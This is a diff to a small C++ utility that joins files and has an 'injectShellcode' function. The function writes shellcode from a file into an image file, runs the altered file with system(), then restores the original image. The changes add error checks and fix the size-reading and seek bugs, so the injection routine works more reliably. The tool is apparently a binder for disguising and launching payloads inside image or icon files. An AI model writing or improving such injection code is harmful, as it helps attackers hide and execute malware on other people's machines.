@@ -3,7 +3,7 @@
 #include <vector>
 #include <string>
 #include <cstdint>
-#include <cstdlib> 
+#include <cstdlib> // For system() - necessary to run the injected executable
 
 const std::string version = "0.0.0.2";
 
@@ -24,13 +24,21 @@ void displayVersion() {
 
 void concatenateFiles(const std::string& outputFile, const std::vector<std::string>& files) {
     std::ofstream output(outputFile, std::ios::binary);
+    if (!output) {
+        std::cerr << "Error opening output file: " << outputFile << std::endl;
+        return;
+    }
 
     for (const auto& file : files) {
         std::ifstream input(file, std::ios::binary);
+        if (!input) {
+            std::cerr << "Error opening input file: " << file << std::endl;
+            return;
+        }
         output << input.rdbuf();
     }
 
-    std::cout << "Successfully concatenated files in " << outputFile << std::endl;
+    std::cout << "Successfully concatenated files into " << outputFile << std::endl;
 }
 
 bool isExecutable(const std::string& filename) {
@@ -49,13 +57,23 @@ bool isIcon(const std::string& filename) {
 }
 
 void injectShellcode(const std::string& imageFile, const std::string& shellcodeFile) {
-    std::ifstream shellcodeInput(shellcodeFile, std::ios::binary);
+    std::ifstream shellcodeInput(shellcodeFile, std::ios::binary | std::ios::ate);
+    if (!shellcodeInput) {
+        std::cerr << "Error opening shellcode file: " << shellcodeFile << std::endl;
+        return;
+    }
+
     std::ifstream imageInput(imageFile, std::ios::binary | std::ios::ate);
+    if (!imageInput) {
+        std::cerr << "Error opening image file: " << imageFile << std::endl;
+        return;
+    }
 
     // Get the size of the shellcode and image file
     std::streamsize shellcodeSize = shellcodeInput.tellg();
     std::streamsize imageSize = imageInput.tellg();
     imageInput.seekg(0, std::ios::beg);
+    shellcodeInput.seekg(0, std::ios::beg);
 
     // Check if the shellcode size is larger than the image size
     if (shellcodeSize > imageSize) {
@@ -101,6 +119,7 @@ void injectShellcode(const std::string& imageFile, const std::string& shellcodeF
     int result = system(command.c_str()); // Run the injected executable
 
     // Restore the original image
+    imageOutput.seekp(0);
     if (!imageOutput.write(originalImageBuffer.data(), imageSize)) {
         std::cerr << "Error restoring the original image." << std::endl;
         return;
